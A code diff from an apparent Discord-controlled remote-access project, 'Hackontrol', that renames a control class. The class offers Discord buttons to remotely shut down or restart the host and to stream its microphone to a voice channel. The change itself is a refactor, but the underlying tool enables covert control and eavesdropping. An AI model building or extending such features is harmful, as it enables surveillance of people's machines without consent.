@@ -1,9 +1,8 @@
-package com.khopan.hackontrol.channel.control;
+package com.khopan.hackontrol.module.control;
 
 import java.util.List;
 
 import com.khopan.hackontrol.Hackontrol;
-import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
@@ -11,6 +10,7 @@ import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.Question;
 import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
+import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolMessage;
@@ -22,8 +22,8 @@ import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.managers.AudioManager;
 
-public class ControlChannel extends HackontrolChannel {
-	private static final String CHANNEL_NAME = "control";
+public class ControlModule extends Module {
+	private static final String MODULE_NAME = "control";
 
 	private static final Button BUTTON_SLEEP      = ButtonManager.staticButton(ButtonType.SECONDARY, "Sleep",      "sleep");
 	private static final Button BUTTON_HIBERNATE  = ButtonManager.staticButton(ButtonType.SUCCESS,   "Hibernate",  "hibernate");
@@ -36,7 +36,7 @@ public class ControlChannel extends HackontrolChannel {
 	private AudioManager audioManager;
 	private MicrophoneSendHandler sendHandler;
 
-	public ControlChannel() {
+	public ControlModule() {
 		Hackontrol.getInstance().setErrorHandler((thread, Errors) -> {
 			if(this.channel != null) {
 				HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
@@ -46,23 +46,23 @@ public class ControlChannel extends HackontrolChannel {
 
 	@Override
 	public String getName() {
-		return ControlChannel.CHANNEL_NAME;
+		return ControlModule.MODULE_NAME;
 	}
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_SLEEP,      context -> this.buttonPower(context, PowerAction.SLEEP));
-		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_HIBERNATE,  context -> this.buttonPower(context, PowerAction.HIBERNATE));
-		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_RESTART,    context -> this.buttonPower(context, PowerAction.RESTART));
-		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN,   context -> this.buttonPower(context, PowerAction.SHUTDOWN));
-		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT,    context -> this.buttonConnect(context, true));
-		registry.register(InteractionManager.BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.buttonConnect(context, false));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_SLEEP,      context -> this.buttonPower(context, PowerAction.SLEEP));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_HIBERNATE,  context -> this.buttonPower(context, PowerAction.HIBERNATE));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_RESTART,    context -> this.buttonPower(context, PowerAction.RESTART));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_SHUTDOWN,   context -> this.buttonPower(context, PowerAction.SHUTDOWN));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_CONNECT,    context -> this.buttonConnect(context, true));
+		registry.register(InteractionManager.BUTTON_REGISTRY, ControlModule.BUTTON_DISCONNECT, context -> this.buttonConnect(context, false));
 	}
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessage("**Power Control**").addActionRow(ControlChannel.BUTTON_SLEEP, ControlChannel.BUTTON_HIBERNATE, ControlChannel.BUTTON_RESTART, ControlChannel.BUTTON_SHUTDOWN).queue();
-		this.channel.sendMessage("**Microphone Control**").addActionRow(ControlChannel.BUTTON_CONNECT, ControlChannel.BUTTON_DISCONNECT).queue();
+		this.channel.sendMessage("**Power Control**").addActionRow(ControlModule.BUTTON_SLEEP, ControlModule.BUTTON_HIBERNATE, ControlModule.BUTTON_RESTART, ControlModule.BUTTON_SHUTDOWN).queue();
+		this.channel.sendMessage("**Microphone Control**").addActionRow(ControlModule.BUTTON_CONNECT, ControlModule.BUTTON_DISCONNECT).queue();
 	}
 
 	private void buttonPower(ButtonContext context, PowerAction powerAction) {
